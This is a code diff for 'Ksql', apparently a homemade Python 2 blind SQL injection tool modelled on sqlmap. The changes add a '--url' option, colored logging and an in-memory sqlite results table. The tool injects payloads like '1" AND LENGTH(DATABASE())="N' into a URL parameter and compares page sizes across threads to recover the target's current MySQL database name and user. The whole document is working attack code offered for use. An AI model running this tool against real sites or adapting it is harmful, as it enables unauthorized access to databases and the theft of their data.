@@ -6,36 +6,55 @@
 	version:	Ksql 1.0
 """
 
-import sys, os, io, inspect, string, time, urllib, re, urlparse, difflib, chardet, filecmp, json, getopt
+import sys, os, io, inspect, string, time, urllib, re, urlparse, difflib, chardet, filecmp, json, getopt, datetime, ctypes, threading, sqlite3
 from difflib import *
-import threading
-from time import ctime,sleep 
-
+from time import ctime,sleep
 
 reload(sys)
 sys.setdefaultencoding('utf8')
 
+def set_cmd_text_color(color, handle=ctypes.windll.kernel32.GetStdHandle(-11)):
+	Bool = ctypes.windll.kernel32.SetConsoleTextAttribute(handle, color)
+	return Bool
+
+
+def resetColor():
+	set_cmd_text_color(0x0f)
+ 
+
+def printDarkGray(mess):
+	set_cmd_text_color(0x08)
+	sys.stdout.write(mess)
+	resetColor()
+ 
+
+def printDarkGreen(mess):
+	set_cmd_text_color(0x02)
+	sys.stdout.write(mess)
+	resetColor()
+
+
+def printDarkYellow(mess):
+	set_cmd_text_color(0x06)
+	sys.stdout.write(mess)
+	resetColor()
+ 
+
+
 def main(argv):
-     for arg in argv:
-        print arg
-		
-		
+	 for arg in argv:
+		print arg
+
+
 def modulePath():
-    """
-    This will get us the program's directory, even if we are frozen
-    using py2exe
-    """
+	try:
+		_ = sys.executable if weAreFrozen() else __file__
+	except NameError:
+		_ = inspect.getsourcefile(modulePath)
+	return os.path.dirname(os.path.realpath(_))
 
-    try:
-        _ = sys.executable if weAreFrozen() else __file__
-    except NameError:
-        _ = inspect.getsourcefile(modulePath)
 
-    return os.path.dirname(os.path.realpath(_))
-
-	
 def htmlDecode(string):
-
 	tmpHtmlaEncode = None
 	try:
 		pageInfo = chardet.detect(string)
@@ -52,7 +71,22 @@ def htmlDecode(string):
 		return
 		
 	return tmpHtmlEncode
-	
+
+KSQL_ROOT_PATH   = modulePath()
+KSQL_XML_PATH    = os.path.join(KSQL_ROOT_PATH, 'xml')
+QUERIES_XML      = os.path.join(KSQL_XML_PATH, 'queries.xml')
+MAX_BLIND_COUNT  = 15
+
+sqlliteCon    = sqlite3.connect(':memory:', check_same_thread=False)
+#sqlliteCon    = sqlite3.connect(KSQL_ROOT_PATH + '/ksql.db', check_same_thread=False)
+sqlliteCursor = sqlliteCon.cursor()
+sqlliteCon.execute('drop table if exists info')
+sqlliteCon.commit()
+sqlliteCon.execute('create table info(id integer primary key autoincrement,type varchar(10) UNIQUE,value varchar(50))')
+sqlliteCon.execute('insert into info(type, value) values("--current-db", "")')
+sqlliteCon.execute('insert into info(type, value) values("--current-user", "")')
+sqlliteCon.commit()
+
 
 def run(type, tmpUrl, num, succPageSize, frontThread):
 	
@@ -72,115 +106,126 @@ def run(type, tmpUrl, num, succPageSize, frontThread):
 			
 		currPageSize = len(htmlDecode(urllib.urlopen(newUrl).read()))
 		
-		print newUrl
+		now = datetime.datetime.now()
+		
+		printDarkGray("[%s] [INFO] %s \r\n" %(now.strftime('%H:%M:%S'), newUrl))
 		
 		if succPageSize == currPageSize:
-			file_object = open('infomation.log', 'a')
-			file_object.write(word)
-			file_object.close()
-			print '================: ' + word
+			sql = 'update info set value=value||"%s" where type="%s"' % (word, type)
+			sqlliteCon.execute(sql)
+			sqlliteCon.commit()
+			
+			printDarkGreen("[%s] [INFO] Hint %s \r\n" %(now.strftime('%H:%M:%S'), word))
 			break
 			
-		print "Time: %s \r\n" %(ctime())
-		time.sleep(0.1)
-
-	
-SQLMAP_ROOT_PATH = modulePath()
-KSQL_XML_PATH = os.path.join(SQLMAP_ROOT_PATH, "xml")
-QUERIES_XML = os.path.join(KSQL_XML_PATH, "queries.xml")
+		#time.sleep(0.1)
 
 
-url = 'http://localhost/test/test.php?id=1&name=kaysen'
-
-
-if os.path.exists('infomation.log'):
-	os.remove('infomation.log')
-
-	
-def manage(type):	
+def manage(type, url):
 	values = url.split('?')[-1]
 	host = url.split('?')[0]
 	tmpUrl = ''
-	
+
 	'''
 	暂时先只处理一个参数
 	'''
 	for key_value in values.split('&'):
 		val = key_value.split('=')
 		tmpUrl = host + '?' + val[0] + '=[[[' + val[0].upper() + ']]]'
-		
 		break
 
+	succPageSize = len(htmlDecode(urllib.urlopen(url).read()))
+	''' 猜解位数 '''
+	blindCount = 0
+	for num in range(1, MAX_BLIND_COUNT):
+
+		digitUrl = ''
+		if type == '--current-db':
+			digitUrl = tmpUrl.replace('[[[ID]]]', '1" AND LENGTH(DATABASE())="' + str(num))
+		elif type == '--current-user':
+			digitUrl = tmpUrl.replace('[[[ID]]]', '1" AND LENGTH(USER())="' + str(num))
+
+		if digitUrl != '' and len(htmlDecode(urllib.urlopen(digitUrl).read())) == succPageSize:
+			blindCount = num
 
 	''' Blind SQL Injection '''
-	succPageSize = len(htmlDecode(urllib.urlopen(url).read()))
 	threads = []
-	''' 枚举位数 '''
-	for num in range(1, 15):
-		#run(tmpUrl, num, succPageSize)
-		
+	for num in range(1, blindCount+1):
 		if len(threads) == 0:
 			threads.append(threading.Thread(target=run,args=(type, tmpUrl, num, succPageSize, None)))
 		else:
 			threads.append(threading.Thread(target=run,args=(type, tmpUrl, num, succPageSize, threads[-1])))
-	
+
 	for item in threads:
 		item.setDaemon(True)
 		item.start()
-		
 	item.join()
-	
-	
 
-	file_object = open('infomation.log', 'r')
-	try:
-		 all_the_text = file_object.read()
-	finally:
-		 file_object.close()
 
-		 
-	print "Result: " + all_the_text
-	
+
+	cursor = sqlliteCursor.execute('select value from info where type="%s"' % type)
+	checkRes = cursor.fetchone()
+
+	if type == '--current-db':
+		printDarkYellow('Databse: ' + checkRes[0] + "\r\n")
+	elif type == '--current-user':
+		printDarkYellow('User: ' + checkRes[0] + "\r\n")
+
 
 def Usage():
 	print 'Ksql.py usage:'
-	print '--current-user, Retrieve DBMS current user'
-	print '--current-db, Retrieve DBMS current database'
+	print '--current-user, Retrieve Mysql current user'
+	print '--current-db, Retrieve Mysql current database'
 	print '-h, --help: print help message.'
 	print '-v, --version: print script version'
+
 def Version():
-    print 'Ksql v1.0'
+	print 'Ksql v1.0'
+
 def OutPut(args):
-    print 'Hello, %s'%args
+	print 'Hello, %s'%args
+
 def main(argv):
 	if len(argv) == 1:
 		Usage()
 		sys.exit(2)
 
 	try:
-		opts, args = getopt.getopt(argv[1:], 'hv:', ['current-db', 'current-user'])
+		opts, args = getopt.getopt(argv[1:], 'hvu:', ['current-db', 'current-user', 'url='])
 	except getopt.GetoptError, err:
 		print str(err)
 		Usage()
 		sys.exit(2)
 
-		
+	cmd = []
+	url = None
 	for o, a in opts:
 		if o in ('--current-db', '--current-user'):
-			manage(o)
-			sys.exit(0)
+			cmd.append(o)
 		elif o in ('-h', '--help'):
 			Usage()
 			sys.exit(1)
 		elif o in ('-v', '--version'):
 			Version()
 			sys.exit(0)
+		elif o in ('-u', '--url'):
+			url = a
 		else:
 			print 'unhandled option'
 			sys.exit(3)
 
+	if(url == '' or url == None or len(cmd)==0):
+		Usage()
+		sys.exit(1)
+
+	for item in cmd:
+		if item in ('--current-db', '--current-user'):
+			manage(item, url)
+
+
+
 if __name__ == '__main__':
 	main(sys.argv)
-		
-
-	
+	sqlliteCon.close()
+    
+    
